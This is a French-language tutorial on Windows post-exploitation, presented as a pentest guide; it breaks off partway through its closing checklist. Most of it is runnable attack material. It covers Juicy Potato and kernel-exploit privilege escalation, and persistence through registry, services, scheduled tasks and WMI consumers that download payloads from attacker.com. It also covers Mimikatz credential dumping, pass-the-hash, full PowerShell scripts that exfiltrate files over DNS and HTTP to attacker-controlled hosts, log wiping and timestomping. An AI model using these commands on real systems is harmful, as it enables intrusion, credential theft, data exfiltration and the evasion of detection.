# Post-Exploitation Windows - Guide Complet

## üñ•Ô∏è Vue d'ensemble

La **post-exploitation Windows** est l'ensemble des techniques utilis√©es APR√àS avoir obtenu un acc√®s initial √† un syst√®me Windows. C'est la phase la plus critique d'un pentest car elle d√©termine l'ampleur r√©elle de la compromission.

> **üí° Analogie Simple** : C'est comme avoir trouv√© la cl√© d'une maison - maintenant il faut explorer toutes les pi√®ces, chercher les objets de valeur, et s'assurer de pouvoir revenir quand on veut sans se faire remarquer.

## ‚ö†Ô∏è **IMPORTANT - √Ä propos des exemples**

> **üéØ TOUS les noms d'ordinateurs, utilisateurs, domaines dans ce guide sont FICTIFS !**

### üìù Exemples vs R√©alit√© :

**Dans le guide (EXEMPLE FICTIF) :**
```
PC-FINANCE-01\alice
srv-dc-exemple.entreprise.local
192.168.1.50
Administrator:Password123
C:\temp\backdoor.exe
```

**Dans la vraie vie, vous devez adapter :**
```
[VRAIE-MACHINE]\[VRAI-USER]
[VRAI-DC].[VRAI-DOMAINE]
[IP-CIBLE-R√âELLE]
[CREDENTIALS-D√âCOUVERTS]
[CHEMIN-R√âEL-ACCESSIBLE]
```

## üéØ Objectifs d'apprentissage

Apr√®s cette section, vous saurez :
1. **Reconnaissance locale** - √ânum√©rer syst√®me et r√©seau
2. **Escalade de privil√®ges** - Passer d'utilisateur √† administrateur
3. **Persistence** - Maintenir l'acc√®s de fa√ßon durable  
4. **Mouvement lat√©ral** - Compromettre d'autres machines
5. **Exfiltration** - Extraire donn√©es sensibles

## üîç Reconnaissance Post-Compromission

### **Informations syst√®me de base**

#### **Identification environnement**
```cmd
REM === INFORMATIONS SYST√àME ===

REM Version OS pr√©cise
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

REM Sortie exemple :
REM OS Name: Microsoft Windows 10 Enterprise
REM OS Version: 10.0.19044 N/A Build 19044  
REM System Type: x64-based PC

REM Nom machine et domaine
echo %COMPUTERNAME%
echo %USERDOMAIN%
whoami /fqdn

REM Utilisateur actuel et groupes
whoami
whoami /groups
whoami /priv

REM EXEMPLE SORTIE whoami /priv :
REM SeShutdownPrivilege           Shut down the system         Disabled
REM SeChangeNotifyPrivilege       Bypass traverse checking     Enabled 
REM SeUndockPrivilege             Remove computer from docking Disabled
REM SeIncreaseWorkingSetPrivilege Increase a process working   Disabled

REM Architecture processeur
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%
```

#### **Informations r√©seau d√©taill√©es**
```cmd
REM === CONFIGURATION R√âSEAU ===

REM Interfaces r√©seau et IPs
ipconfig /all

REM Table de routage  
route print

REM Connexions r√©seau actives
netstat -an | findstr LISTEN
netstat -an | findstr ESTABLISHED

REM Cache ARP (machines r√©cemment contact√©es)
arp -a

REM EXEMPLE ANALYSE NETSTAT :
REM TCP 0.0.0.0:135 0.0.0.0:0 LISTENING = RPC Endpoint Mapper
REM TCP 0.0.0.0:445 0.0.0.0:0 LISTENING = SMB Server  
REM TCP 192.168.1.50:139 0.0.0.0:0 LISTENING = NetBIOS
REM TCP 192.168.1.50:3389 0.0.0.0:0 LISTENING = RDP

REM Partages r√©seau disponibles
net share

REM DNS et domaine
nslookup %COMPUTERNAME%
echo %LOGONSERVER%
```

### **√ânum√©ration utilisateurs et groupes**

#### **Utilisateurs locaux**
```cmd
REM === UTILISATEURS SYST√àME ===

REM Lister tous utilisateurs locaux
net user

REM SORTIE TYPIQUE :
REM Administrator            alice                   bob
REM DefaultAccount          Guest                   WDAGUtilityAccount

REM D√©tails utilisateur sp√©cifique
net user alice

REM INFORMATIONS IMPORTANTES :
REM Last logon: 20/01/2024 14:30:15
REM Logon hours allowed: All  
REM Local Group Memberships: *Users
REM Global Group memberships: *Domain Users

REM Utilisateurs avec sessions actives
query user
qwinsta

REM EXEMPLE SORTIE qwinsta :
REM SESSIONNAME    USERNAME     ID  STATE   TYPE    DEVICE
REM services                    0   Disc    
REM console        alice        1   Active  
REM rdp-tcp#1      bob          2   Active
```

#### **Groupes et privil√®ges**
```cmd
REM === GROUPES SYST√àME ===

REM Groupes locaux
net localgroup

REM GROUPES CRITIQUES √Ä V√âRIFIER :
REM *Administrators = Contr√¥le total syst√®me
REM *Remote Desktop Users = Acc√®s RDP
REM *Backup Operators = Sauvegarde/restauration
REM *Power Users = Privil√®ges √©tendus (legacy)

REM Membres groupe Administrateurs
net localgroup Administrators

REM Politiques de s√©curit√© locales
secedit /export /cfg secpol.txt
type secpol.txt | findstr Password

REM Gestion des comptes
net accounts

REM SORTIE EXEMPLE :
REM Maximum password age (days): 42
REM Minimum password age (days): 0  
REM Minimum password length: 7
REM Password history length: 24
REM Account lockout threshold: Never
```

### **Processus et services**

#### **Analyse des processus**
```cmd
REM === PROCESSUS EN COURS ===

REM Liste processus d√©taill√©e
tasklist /v
wmic process list full

REM Processus par utilisateur
tasklist /fi "username eq alice"

REM RECHERCHE PROCESSUS SENSIBLES :
tasklist | findstr /i "lsass"      REM Local Security Authority
tasklist | findstr /i "winlogon"   REM Windows Logon
tasklist | findstr /i "csrss"      REM Client Server Runtime
tasklist | findstr /i "explorer"   REM Interface utilisateur

REM Processus avec chemins complets
wmic process get name,processid,parentprocessid,executablepath

REM EXEMPLE ANALYSE :
REM explorer.exe    PID:1234  Parent:winlogon.exe  Path:C:\Windows\explorer.exe
REM notepad.exe     PID:5678  Parent:explorer.exe  Path:C:\Windows\System32\notepad.exe
```

#### **Services Windows**
```cmd
REM === SERVICES SYST√àME ===

REM Tous services et leur √©tat
sc query type= service state= all

REM Services en cours d'ex√©cution
net start

REM Services avec startup automatique
wmic service where startmode="auto" get name,state,pathname

REM SERVICES CRITIQUES S√âCURIT√â :
sc query "Windows Defender Antivirus Service"
sc query "Windows Firewall"  
sc query "Distributed Transaction Coordinator"
sc query "Remote Desktop Services"

REM Configuration service sp√©cifique  
sc qc "nom_service"

REM EXEMPLE SORTIE sc qc :
REM SERVICE_NAME: Spooler
REM TYPE: 110 WIN32_OWN_PROCESS (interactive)
REM START_TYPE: 2 AUTO_START
REM ERROR_CONTROL: 1 NORMAL
REM BINARY_PATH_NAME: C:\Windows\System32\spoolsv.exe
REM ACCOUNT: LocalSystem ‚Üê TR√àS PRIVIL√âGI√â !
```

## üöÄ Escalade de Privil√®ges Windows

### **M√©thodes d'escalade communes**

#### **Tokens et impersonation**
```cmd
REM === WINDOWS ACCESS TOKENS ===

REM Un token = identit√© de s√©curit√© d'un processus
REM Contient : User SID, Group SIDs, Privileges

REM Lister privil√®ges actuels
whoami /priv

REM PRIVIL√àGES DANGEREUX POUR ESCALADE :
REM SeDebugPrivilege = D√©bugger processus (m√™me privil√©gi√©s)
REM SeRestorePrivilege = Restaurer fichiers/registre  
REM SeBackupPrivilege = Sauvegarde bypass ACL
REM SeTakeOwnershipPrivilege = Prendre propri√©t√© objets
REM SeLoadDriverPrivilege = Charger drivers kernel
REM SeImpersonatePrivilege = Usurper identit√© clients

REM Si SeImpersonatePrivilege activ√© ‚Üí Potato attacks possibles !
```

#### **Juicy Potato / Rotten Potato**
```cmd
REM === POTATO ATTACKS ===

REM Principe : Exploit SeImpersonatePrivilege via COM/RPC
REM Fonctionne sur : Windows 7, 8, 10, Server 2008-2019

REM 1. V√©rifier privil√®ge requis
whoami /priv | findstr SeImpersonatePrivilege

REM 2. T√©l√©charger JuicyPotato.exe sur cible
REM (Via upload, certutil, PowerShell, etc.)

REM 3. Utiliser JuicyPotato pour escalade
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

REM CLSID communes pour diff√©rents OS :
REM Windows 10 Pro: {4991d34b-80a1-4291-83b6-3328366b9097}
REM Windows Server 2016: {659cdea7-489e-11d9-a9cd-000d56965251}
REM Windows Server 2019: {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

REM 4. Si succ√®s ‚Üí shell SYSTEM obtenu !
whoami
REM NT AUTHORITY\SYSTEM
```

#### **Vuln√©rabilit√©s kernel communes**
```cmd
REM === CVE KERNEL EXPLOITS ===

REM 1. Identifier version exacte OS
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

REM 2. Rechercher exploits pour cette version
REM MS16-032 (CVE-2016-0099) - Secondary Logon Handle
REM MS17-017 (CVE-2017-0213) - Windows COM Elevation of Privilege
REM CVE-2019-1388 - Certificate Dialog Elevation of Privilege
REM CVE-2020-0787 - Background Intelligent Transfer Service

REM 3. Exemple utilisation MS16-032
powershell -Command "& {Import-Module .\MS16-032.ps1; Invoke-MS16032}"

REM ATTENTION : Exploits kernel = risque BSOD !
REM Toujours tester en lab avant production
```

### **Techniques PowerShell**

#### **PowerUp pour √©num√©ration escalade**
```powershell
# === POWERUP PRIVESC ENUMERATION ===

# 1. Importer PowerUp
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# 2. √ânum√©ration compl√®te
Invoke-AllChecks

# V√âRIFICATIONS POWERUP :
# [*] Checking for unquoted service paths...
# [*] Checking service executable permissions...  
# [*] Checking service permissions...
# [*] Checking %PATH% for potentially hijackable DLL locations...
# [*] Checking for AlwaysInstallElevated registry keys...
# [*] Checking for Autologon credentials in registry...
# [*] Checking for modififiable registry autoruns and configs...

# 3. Exploiter service unquoted path (exemple)
# Si service : C:\Program Files\Vulnerable Service\service.exe
# Cr√©er : C:\Program.exe ou C:\Program Files\Vulnerable.exe

# 4. Exploiter permissions service faibles
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose
```

#### **PrivescCheck automatis√©**
```powershell
# === PRIVESCCHECK SCRIPT ===

# 1. T√©l√©charger et ex√©cuter
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1')

# 2. Scan complet avec rapport
Invoke-PrivescCheck -Report PrivescCheck_HOSTNAME -Format TXT,HTML

# CAT√âGORIES V√âRIFI√âES :
# USER - Current user, groups, privileges
# SERVICES - Windows services
# APPS - Installed applications  
# SCHEDULED TASKS - Scheduled tasks
# WINDOWS - Windows settings
# NETWORK - Network interfaces, routing
# PROCESSES - Running processes
# CREDENTIALS - Cached credentials

# 3. Analyse r√©sultats
# VULNERABILITY - Exploitable imm√©diatement
# MEDIUM - Potentiellement exploitable  
# LOW - Information gathering
# INFO - Informatif seulement
```

## üîê Persistence Windows

### **M√©thodes de persistence registry**

#### **Run keys (d√©marrage utilisateur)**
```cmd
REM === PERSISTENCE VIA REGISTRE ===

REM 1. Cl√©s de d√©marrage automatique HKCU (utilisateur actuel)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

REM 2. Cl√©s de d√©marrage HKLM (tous utilisateurs) - N√âCESSITE ADMIN
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f

REM 3. RunOnce (ex√©cute une fois puis se supprime)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "TempCleanup" /t REG_SZ /d "C:\temp\payload.exe" /f

REM 4. V√©rifier persistance install√©e
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

REM 5. Supprimer persistence (nettoyage)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
```

#### **Services Windows personnalis√©s**
```cmd
REM === PERSISTENCE VIA SERVICE WINDOWS ===

REM 1. Cr√©er service personnalis√© (N√âCESSITE ADMIN)
sc create "WindowsSecurityUpdate" binpath= "C:\Windows\System32\backdoor.exe" start= auto

REM 2. Configurer description r√©aliste
sc description "WindowsSecurityUpdate" "Provides security updates for Windows components"

REM 3. D√©marrer service
sc start "WindowsSecurityUpdate"

REM 4. V√©rifier service cr√©√©
sc query "WindowsSecurityUpdate"

REM 5. Service avec red√©marrage automatique si erreur
sc failure "WindowsSecurityUpdate" reset= 86400 actions= restart/30000/restart/60000/restart/120000

REM AVANTAGES SERVICE :
REM - Red√©marre automatiquement au boot
REM - Survit aux red√©marrages
REM - Moins suspect qu'un .exe isol√©
REM - Peut tourner en SYSTEM

REM 6. Suppression service (nettoyage)
sc stop "WindowsSecurityUpdate"
sc delete "WindowsSecurityUpdate"
```

### **T√¢ches planifi√©es (Scheduled Tasks)**

#### **Persistence via schtasks**
```cmd
REM === PERSISTENCE T√ÇCHES PLANIFI√âES ===

REM 1. T√¢che quotidienne √† 9h00
schtasks /create /tn "SystemMaintenance" /tr "C:\Windows\System32\backdoor.exe" /sc daily /st 09:00 /ru SYSTEM

REM 2. T√¢che au d√©marrage syst√®me
schtasks /create /tn "BootLoader" /tr "powershell.exe -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" /sc onstart /ru SYSTEM

REM 3. T√¢che √† la connexion utilisateur
schtasks /create /tn "UserLogonScript" /tr "C:\temp\logon.bat" /sc onlogon /ru %USERNAME%

REM 4. T√¢che r√©currente toutes les 30 minutes
schtasks /create /tn "SecurityScan" /tr "C:\Windows\Temp\scan.exe" /sc minute /mo 30 /ru SYSTEM

REM PARAM√àTRES UTILES :
REM /ru SYSTEM = Ex√©cute avec privil√®ges SYSTEM
REM /ru %USERNAME% = Ex√©cute avec compte utilisateur actuel
REM /rl HIGHEST = Ex√©cute avec privil√®ges maximum
REM /f = Force cr√©ation (√©crase si existe)

REM 5. Lister t√¢ches cr√©√©es
schtasks /query /tn "SystemMaintenance"
schtasks /query | findstr "SystemMaintenance"

REM 6. Supprimer t√¢che (nettoyage)
schtasks /delete /tn "SystemMaintenance" /f
```

### **WMI Event Subscriptions**

#### **Persistence WMI avanc√©e**
```powershell
# === PERSISTENCE VIA WMI EVENTS ===

# 1. Cr√©er Event Filter (d√©clencheur)
$FilterArgs = @{
    Name = 'SystemStartupFilter'
    Query = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"
    QueryLanguage = 'WQL'
    EventNameSpace = 'root\cimv2'
}
$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $FilterArgs

# 2. Cr√©er Event Consumer (action)
$ConsumerArgs = @{
    Name = 'SystemStartupConsumer'
    CommandLineTemplate = 'powershell.exe -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/payload.ps1\")"'
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $ConsumerArgs

# 3. Lier Filter et Consumer
$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
$Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $BindingArgs

# AVANTAGES WMI PERSISTENCE :
# - Tr√®s difficile √† d√©tecter
# - Survit aux formatages dans certains cas
# - Ex√©cution lors d'√©v√©nements sp√©cifiques
# - Bypass de nombreux antivirus

# 4. V√©rifier persistence WMI
Get-WmiObject -Class __EventFilter -Namespace root\subscription
Get-WmiObject -Class CommandLineEventConsumer -Namespace root\subscription

# 5. Supprimer persistence WMI (nettoyage)
Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\subscription | Remove-WmiObject
Get-WmiObject -Class __EventFilter -Namespace root\subscription -Filter "Name='SystemStartupFilter'" | Remove-WmiObject
Get-WmiObject -Class CommandLineEventConsumer -Namespace root\subscription -Filter "Name='SystemStartupConsumer'" | Remove-WmiObject
```

## üåê Mouvement Lat√©ral

### **Reconnaissance r√©seau local**

#### **D√©couverte d'h√¥tes actifs**
```cmd
REM === D√âCOUVERTE R√âSEAU LOCAL ===

REM 1. Identifier subnet actuel
ipconfig | findstr "IPv4"
REM Exemple r√©sultat : IPv4 Address: 192.168.1.50

REM 2. Ping sweep automatis√©
for /L %i in (1,1,254) do @ping -n 1 -w 1000 192.168.1.%i | findstr "TTL" && echo 192.168.1.%i is alive

REM 3. Scanner ports avec telnet (si disponible)
for /L %i in (1,1,254) do @(echo open 192.168.1.%i 445 & echo quit) | telnet 2>nul | findstr "Connected" && echo 192.168.1.%i:445 is open

REM 4. √ânum√©ration NetBIOS
nbtstat -A 192.168.1.10

REM EXEMPLE SORTIE nbtstat :
REM NetBIOS Remote Machine Name Table
REM Name               Type         Status
REM SRV-WEB-01      <00>  UNIQUE      Registered
REM ENTREPRISE      <00>  GROUP       Registered  
REM SRV-WEB-01      <20>  UNIQUE      Registered ‚Üê SERVICE SMB
REM ENTREPRISE      <1E>  GROUP       Registered ‚Üê BROWSER SERVICE

REM 5. Partages r√©seau sur machines d√©couvertes
net view \\192.168.1.10
dir \\192.168.1.10\c$
```

#### **√ânum√©ration Active Directory**
```cmd
REM === RECONNAISSANCE ACTIVE DIRECTORY ===

REM 1. Informations domaine actuel
echo %USERDNSDOMAIN%
nltest /domain_trusts
net time /domain

REM 2. Contr√¥leurs de domaine
nltest /dclist:%USERDNSDOMAIN%
nslookup -type=SRV _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%

REM 3. Utilisateurs domaine (si droits suffisants)
net user /domain
dsquery user

REM 4. Groupes domaine
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

REM 5. Ordinateurs domaine
net computer /domain
dsquery computer

REM 6. Partages administratifs
net use \\srv-dc-01\admin$
net use \\srv-file-01\c$

REM PARTAGES ADMINISTRATIFS STANDARD :
REM C$ = Partition C: compl√®te  
REM ADMIN$ = Dossier Windows
REM IPC$ = Communication inter-processus
REM PRINT$ = Pilotes imprimantes
REM SYSVOL = Politiques de groupe (DC seulement)
REM NETLOGON = Scripts de connexion (DC seulement)
```

### **Pass-the-Hash et Pass-the-Ticket**

#### **Extraction de hashes**
```cmd
REM === EXTRACTION HASHES AVEC MIMIKATZ ===

REM 1. T√©l√©charger mimikatz.exe sur cible
REM (Attention : D√©tect√© par tous les antivirus)

REM 2. Lancer mimikatz en admin
mimikatz.exe

REM 3. Obtenir privil√®ges debug
privilege::debug

REM 4. Extraire hashes de la m√©moire
sekurlsa::logonpasswords

REM EXEMPLE SORTIE :
REM Authentication Id : 0 ; 123456 (00000000:0001e240)
REM Session           : Interactive from 1
REM User Name         : alice
REM Domain            : ENTREPRISE
REM Logon Server      : SRV-DC-01
REM Logon Time        : 20/01/2024 09:15:32
REM SID               : S-1-5-21-1234567890-0987654321-1122334455-1001
REM         msv :
REM          [00000003] Primary
REM          * Username : alice
REM          * Domain   : ENTREPRISE  
REM          * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c ‚Üê HASH NTLM !
REM          * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709

REM 5. Extraire tickets Kerberos
sekurlsa::tickets /export

REM 6. Sauvegarder base SAM locale
lsadump::sam

REM 7. Dump cache domaine
lsadump::cache
```

#### **Pass-the-Hash avec PSExec**
```cmd
REM === PASS-THE-HASH ATTACK ===

REM 1. Utiliser hash NTLM pour connexion distante
REM Hash obtenu : alice:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

REM 2. PSExec avec hash (Metasploit)
use exploit/windows/smb/psexec
set SMBUser alice
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
set RHOSTS 192.168.1.10
exploit

REM 3. Alternative avec impacket (Linux)
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c alice@192.168.1.10

REM 4. WMIExec pour moins de d√©tection
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c alice@192.168.1.10

REM AVANTAGE PASS-THE-HASH :
REM - Pas besoin du mot de passe en clair
REM - Hash NTLM suffit pour authentification
REM - Fonctionne tant que compte non modifi√©
```

### **Lateral Movement via PowerShell Remoting**

#### **WinRM et PSRemoting**
```powershell
# === POWERSHELL REMOTING ===

# 1. Tester si WinRM activ√© sur cible
Test-WSMan -ComputerName srv-web-01.entreprise.local

# 2. Cr√©er session PowerShell distante
$Session = New-PSSession -ComputerName srv-web-01 -Credential (Get-Credential)

# 3. Ex√©cuter commandes √† distance
Invoke-Command -Session $Session -ScriptBlock { whoami; hostname; ipconfig }

# 4. Copier fichiers via session
Copy-Item -Path "C:\temp\backdoor.exe" -Destination "C:\Windows\Temp\" -ToSession $Session

# 5. Ex√©cuter script distant
Invoke-Command -Session $Session -FilePath "C:\temp\enum.ps1"

# 6. Session interactive
Enter-PSSession -Session $Session

# DANS SESSION DISTANTE :
PS C:\> whoami
srv-web-01\alice
PS C:\> Get-Process | Where-Object {$_.Name -like "*anti*"}

# 7. Fermer session
Exit-PSSession
Remove-PSSession -Session $Session

# AVANTAGES WINRM :
# - Chiffr√© par d√©faut
# - Logging minimal
# - Int√©gr√© Windows
# - Bypass certains AV/EDR
```

## üíæ Collecte et Exfiltration de Donn√©es

### **Recherche de fichiers sensibles**

#### **Recherche automatis√©e**
```cmd
REM === RECHERCHE DONN√âES SENSIBLES ===

REM 1. Fichiers par extensions critiques
dir /s /b C:\ | findstr /i "\.doc$ \.docx$ \.pdf$ \.xls$ \.xlsx$ \.ppt$ \.txt$"

REM 2. Recherche par nom de fichier
dir /s /b C:\ | findstr /i "password password.txt secret config confidential"

REM 3. Recherche dans dossiers utilisateurs
dir /s /b "C:\Users\" | findstr /i "desktop documents downloads"

REM 4. Fichiers r√©cents (modifi√©s derniers 7 jours)
forfiles /p C:\ /s /m *.* /d -7 /c "cmd /c echo @path @fdate"

REM 5. Gros fichiers (plus de 100MB)
forfiles /p C:\ /s /m *.* /c "cmd /c if @fsize GEQ 104857600 echo @path @fsize"

REM 6. Recherche contenu dans fichiers texte
findstr /s /i /m "password\|secret\|confidential\|private" C:\*.txt C:\*.log C:\*.cfg

REM 7. Base de donn√©es potentielles
dir /s /b C:\ | findstr /i "\.mdb$ \.accdb$ \.db$ \.sqlite$ \.bak$"

REM DOSSIERS INT√âRESSANTS √Ä EXAMINER :
REM C:\Users\%USERNAME%\Documents\
REM C:\Users\%USERNAME%\Desktop\
REM C:\Users\%USERNAME%\Downloads\
REM C:\ProgramData\
REM C:\Windows\System32\config\
REM C:\inetpub\wwwroot\ (si serveur web)
```

#### **Extraction credentials Windows**
```powershell
# === EXTRACTION CREDENTIALS AVANC√âE ===

# 1. Historique PowerShell (peut contenir passwords)
Get-Content (Get-PSReadlineOption).HistorySavePath

# 2. Credentials Manager Windows
cmdkey /list
# Puis utiliser : runas /savecred /user:DOMAIN\user "cmd.exe"

# 3. Recherche dans registre
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# 4. Fichiers de configuration IIS
Get-ChildItem -Path C:\inetpub\ -Include *.config -Recurse | Select-String -Pattern "connectionString\|password"

# 5. Scripts et fichiers batch
Get-ChildItem -Path C:\ -Include *.bat,*.cmd,*.ps1,*.vbs -Recurse | Select-String -Pattern "password\|pwd\|pass"

# 6. Fichiers de connexion RDP sauvegard√©s
Get-ChildItem -Path "C:\Users\" -Include "*.rdp" -Recurse

# 7. Cl√©s SSH priv√©es
Get-ChildItem -Path C:\ -Include "id_rsa","id_dsa","*.pem" -Recurse

# 8. Historique navigateurs (n√©cessite outils sp√©cialis√©s)
# Chrome : C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data
# Firefox : C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles\
```

### **M√©thodes d'exfiltration**

#### **Exfiltration via DNS**
```powershell
# === EXFILTRATION DNS (DISCR√àTE) ===

# 1. Encoder fichier en Base64
$FileContent = Get-Content -Path "C:\temp\secrets.txt" -Raw
$EncodedContent = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($FileContent))

# 2. D√©couper en petits chunks (DNS limit√© √† 255 chars)
$ChunkSize = 50
$Chunks = @()
for ($i = 0; $i -lt $EncodedContent.Length; $i += $ChunkSize) {
    $Chunks += $EncodedContent.Substring($i, [Math]::Min($ChunkSize, $EncodedContent.Length - $i))
}

# 3. Envoyer chaque chunk via requ√™te DNS
$Domain = "attacker-controlled.com"
$SessionId = Get-Random
for ($i = 0; $i -lt $Chunks.Count; $i++) {
    $Subdomain = "$SessionId-$i-$($Chunks[$i]).$Domain"
    try {
        nslookup $Subdomain 2>$null
    } catch {}
    Start-Sleep -Milliseconds 500
}

# 4. C√¥t√© attaquant : parser logs DNS pour r√©cup√©rer donn√©es
# Logs DNS contiennent : 12345-0-VGVzdCBkYXRh.attacker-controlled.com
# ‚Üí Extraire partie Base64 et d√©coder
```

#### **Exfiltration via HTTP POST**
```powershell
# === EXFILTRATION HTTP ===

# 1. Fonction upload fichier
function Upload-File {
    param(
        [string]$FilePath,
        [string]$UploadUrl = "http://attacker.com/upload.php"
    )
    
    if (Test-Path $FilePath) {
        $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $FileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($FileBytes)
        
        $Boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $BodyLines = (
            "--$Boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream$LF",
            $FileEnc,
            "--$Boundary--$LF"
        ) -join $LF
        
        try {
            $Response = Invoke-RestMethod -Uri $UploadUrl -Method Post -ContentType "multipart/form-data; boundary=$Boundary" -Body $BodyLines
            Write-Host "Upload successful: $Response"
        } catch {
            Write-Host "Upload failed: $($_.Exception.Message)"
        }
    }
}

# 2. Utilisation
Upload-File -FilePath "C:\temp\database_backup.sql"
Upload-File -FilePath "C:\Users\alice\Documents\passwords.xlsx"

# 3. Upload multiple fichiers
Get-ChildItem -Path "C:\Users\alice\Documents\" -Include "*.doc","*.pdf","*.xls" -Recurse | ForEach-Object {
    Upload-File -FilePath $_.FullName
    Start-Sleep -Seconds 2
}
```

## üßπ Nettoyage et Anti-Forensics

### **Suppression de traces**

#### **Logs et √©v√©nements**
```cmd
REM === NETTOYAGE LOGS WINDOWS ===

REM 1. Vider logs syst√®me (N√âCESSITE ADMIN)
wevtutil cl System
wevtutil cl Application  
wevtutil cl Security

REM 2. Logs sp√©cifiques PowerShell
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Windows PowerShell"

REM 3. Historique commandes
doskey /history
REM Puis : Alt+F7 pour vider buffer

REM 4. Historique PowerShell
Remove-Item (Get-PSReadlineOption).HistorySavePath

REM 5. Fichiers temporaires
del /q /f /s %TEMP%\*.*
del /q /f /s C:\Windows\Temp\*.*
del /q /f /s C:\Windows\Prefetch\*.*

REM 6. Corbeille
rd /s /q C:\$Recycle.Bin

REM 7. Journaux IIS (si serveur web)
del /q /f "C:\inetpub\logs\LogFiles\W3SVC1\*.log"

REM 8. D√©sactiver logging temporairement (TR√àS SUSPECT)
wevtutil sl Security /e:false
wevtutil sl System /e:false
REM ATTENTION : D√©sactiver logs = alerte SOC garantie !
```

#### **Timestomping et attributs fichiers**
```cmd
REM === MODIFICATION TIMESTAMPS ===

REM 1. Copier timestamps d'un fichier syst√®me vers notre payload
forfiles /m "notepad.exe" /c "cmd /c echo @fdate @ftime"
REM R√©sultat : 20/01/2024 09:30:15

REM 2. Modifier timestamp de notre fichier
touch -r C:\Windows\System32\notepad.exe C:\temp\backdoor.exe

REM Alternative PowerShell :
(Get-Item "C:\temp\backdoor.exe").CreationTime = (Get-Item "C:\Windows\System32\notepad.exe").CreationTime
(Get-Item "C:\temp\backdoor.exe").LastWriteTime = (Get-Item "C:\Windows\System32\notepad.exe").LastWriteTime
(Get-Item "C:\temp\backdoor.exe").LastAccessTime = (Get-Item "C:\Windows\System32\notepad.exe").LastAccessTime

REM 3. Masquer fichier (attribut cach√©)
attrib +h +s +r C:\temp\backdoor.exe

REM 4. ADS (Alternate Data Streams) pour cacher donn√©es
echo "malicious payload" > C:\Windows\System32\calc.exe:hidden.txt
REM Invisible dans dir normal, lisible avec :
more < C:\Windows\System32\calc.exe:hidden.txt
```

## üìã Checklist Post-Exploitation

### **Phase reconnaissance**
```bash
‚òê Informations syst√®me collect√©es (OS, architecture, patches)
‚òê Utilisateur actuel et privil√®ges identifi√©s
‚òê Groupes et appartenances document√©s
‚òê Processus et services analys√©s
‚òê Configuration r√©seau mapp√©e
‚òê Interfaces et routes document√©es
‚òê Pare-feu et antivirus identifi√©s
‚òê Logiciels install√©s inventori√©s
```

### **Phase escalade privil√®ges**
```bash
‚òê Privil√®ges actuels analys√©s (whoami /priv)
‚òê Services mal configur√©s identifi√©s
‚òê Vuln√©rabilit√©s kernel recherch√©es
‚òê Tokens et impersonation test√©s
‚òê T√¢ches planifi√©es examin√©es
‚òê Autostart locations v√©rifi√©es
‚òê Credentials en registre recherch√©es
‚òê Escalade r√©ussie et document√©e
```

### **Phase persistence**
```bash
‚òê M√©thode persistence choisie et impl√©ment√©e
‚òê Registry Run keys test√©es
‚òê Services Windows cr√©√©s si n√©cessaire
‚òê T√¢ches planifi√©es configur√©es
‚òê WMI events configur√©s si requis
‚òê Backup persistence cr√©√©e
‚òê Persistence test√©e apr√®s red√©marrage
‚òê M√©thodes suppression document√©es
```

### **Phase mouvement lat√©ral**
```bash
‚òê R√©seau local scann√© et mapp√©
‚òê H√¥tes actifs identifi√©s
‚òê Services expos√©s inventori√©s
‚òê Credentials extraites de m√©moire
‚òê Hashes et tickets collect√©s
‚òê Pass-the-hash test√©
‚òê Acc√®s suppl√©mentaires obtenus
‚òê Mapping Active Directory effectu√©
```

### **Phase collecte donn√©es**
```bash
‚òê Fichiers sensibles identifi√©s et localis√©s
‚òê Credentials additionnelles extraites
